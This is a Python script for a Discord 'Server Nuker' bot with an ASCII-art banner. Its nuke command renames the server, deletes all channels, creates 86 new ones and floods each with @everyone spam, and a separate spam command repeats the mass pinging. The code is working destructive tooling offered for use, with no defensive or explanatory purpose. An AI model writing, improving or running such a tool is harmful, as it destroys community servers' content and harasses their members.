import discord
from discord.ext import commands, tasks
from itertools import cycle
import os
import random
import colorama
from colorama import Fore
colorama.init()


def nukeserver():
    client = commands.Bot(command_prefix = '.')
    status = cycle(["Made by Feciouss!"])
    @tasks.loop(seconds = 100)
    async def change_status():
        await client.change_presence(activity = discord.Game(next(status)))

    count = 0


    print(Fore.MAGENTA + '''                                                                                                                                                                                                                             
                                                                                                                                                                                                                             
       SSSSSSSSSSSSSSS                                                                                                         NNNNNNNN        NNNNNNNN                  kkkkkkkk                                                
     SS:::::::::::::::S                                                                                                        N:::::::N       N::::::N                  k::::::k                                                
    S:::::SSSSSS::::::S                                                                                                        N::::::::N      N::::::N                  k::::::k                                                
    S:::::S     SSSSSSS                                                                                                        N:::::::::N     N::::::N                  k::::::k                                                
    S:::::S                eeeeeeeeeeee    rrrrr   rrrrrrrrrvvvvvvv           vvvvvvv eeeeeeeeeeee    rrrrr   rrrrrrrrr        N::::::::::N    N::::::Nuuuuuu    uuuuuu   k:::::k    kkkkkkk eeeeeeeeeeee    rrrrr   rrrrrrrrr   
   S:::::S              ee::::::::::::ee  r::::rrr:::::::::rv:::::v         v:::::vee::::::::::::ee  r::::rrr:::::::::r       N:::::::::::N   N::::::Nu::::u    u::::u   k:::::k   k:::::kee::::::::::::ee  r::::rrr:::::::::r  
     S::::SSSS          e::::::eeeee:::::eer:::::::::::::::::rv:::::v       v:::::ve::::::eeeee:::::eer:::::::::::::::::r      N:::::::N::::N  N::::::Nu::::u    u::::u   k:::::k  k:::::ke::::::eeeee:::::eer:::::::::::::::::r 
      SS::::::SSSSS    e::::::e     e:::::err::::::rrrrr::::::rv:::::v     v:::::ve::::::e     e:::::err::::::rrrrr::::::r     N::::::N N::::N N::::::Nu::::u    u::::u   k:::::k k:::::ke::::::e     e:::::err::::::rrrrr::::::r
        SSS::::::::SS  e:::::::eeeee::::::e r:::::r     r:::::r v:::::v   v:::::v e:::::::eeeee::::::e r:::::r     r:::::r     N::::::N  N::::N:::::::Nu::::u    u::::u   k::::::k:::::k e:::::::eeeee::::::e r:::::r     r:::::r
           SSSSSS::::S e:::::::::::::::::e  r:::::r     rrrrrrr  v:::::v v:::::v  e:::::::::::::::::e  r:::::r     rrrrrrr     N::::::N   N:::::::::::Nu::::u    u::::u   k:::::::::::k  e:::::::::::::::::e  r:::::r     rrrrrrr
                S:::::Se::::::eeeeeeeeeee   r:::::r               v:::::v:::::v   e::::::eeeeeeeeeee   r:::::r                 N::::::N    N::::::::::Nu::::u    u::::u   k:::::::::::k  e::::::eeeeeeeeeee   r:::::r            
                S:::::Se:::::::e            r:::::r                v:::::::::v    e:::::::e            r:::::r                 N::::::N     N:::::::::Nu:::::uuuu:::::u   k::::::k:::::k e:::::::e            r:::::r            
    SSSSSSS     S:::::Se::::::::e           r:::::r                 v:::::::v     e::::::::e           r:::::r                 N::::::N      N::::::::Nu:::::::::::::::uuk::::::k k:::::ke::::::::e           r:::::r            
    S::::::SSSSSS:::::S e::::::::eeeeeeee   r:::::r                  v:::::v       e::::::::eeeeeeee   r:::::r                 N::::::N       N:::::::N u:::::::::::::::uk::::::k  k:::::ke::::::::eeeeeeee   r:::::r            
    S:::::::::::::::SS   ee:::::::::::::e   r:::::r                   v:::v         ee:::::::::::::e   r:::::r                 N::::::N        N::::::N  uu::::::::uu:::uk::::::k   k:::::kee:::::::::::::e   r:::::r            
     SSSSSSSSSSSSSSS       eeeeeeeeeeeeee   rrrrrrr                    vvv            eeeeeeeeeeeeee   rrrrrrr                 NNNNNNNN         NNNNNNN    uuuuuuuu  uuuukkkkkkkk    kkkkkkk eeeeeeeeeeeeee   rrrrrrr            






                                                                                                                                                                                                                                 ''')
    print(Fore.LIGHTMAGENTA_EX + 'Mad' + Fore.CYAN + 'e by ' + Fore.LIGHTYELLOW_EX + 'Fec' + Fore.LIGHTGREEN_EX +  'iou' + Fore.RED +  'ss')
    TOKEN = input(Fore.GREEN + "[$]Enter Bot Token>")
    SERVER_GUILD_NAME = input("[$]Enter name you want the server to be called>")
    CHANNEL_NAME = input("[$]Message you want to channel to be called>")
    TEXT_NAME = input("[$]Message you want to be spammed>")
    print('-------------------------------------')
    print(Fore.LIGHTWHITE_EX + '[$]Use .nuke to nuke the server!')
    print('[$]Use .spam to spam your message')


    @client.command()
    async def nuke(ctx):

        await ctx.guild.edit(name=SERVER_GUILD_NAME) 

        for c in ctx.guild.channels:
            await c.delete()

        guild = ctx.message.guild

        n=0
        while(n<=85):
            await guild.create_text_channel(CHANNEL_NAME)
            n = n+1

        for c in ctx.guild.text_channels:
                await c.send('@everyone' + TEXT_NAME) 
                await c.send('@everyone' + TEXT_NAME)
                await c.send('@everyone' + TEXT_NAME)
                await c.send('@everyone' + TEXT_NAME)
                await c.send('@everyone' + TEXT_NAME)
        





    @client.command()
    async def spam(ctx):
        for c in ctx.guild.text_channels:
                await c.send ('@everyone' + TEXT_NAME) 
                await c.send ('@everyone'+ TEXT_NAME)
                await c.send('@everyone'+ TEXT_NAME)
                await c.send('@everyone'+ TEXT_NAME)
                await c.send('@everyone'+ TEXT_NAME)






    client.run(TOKEN)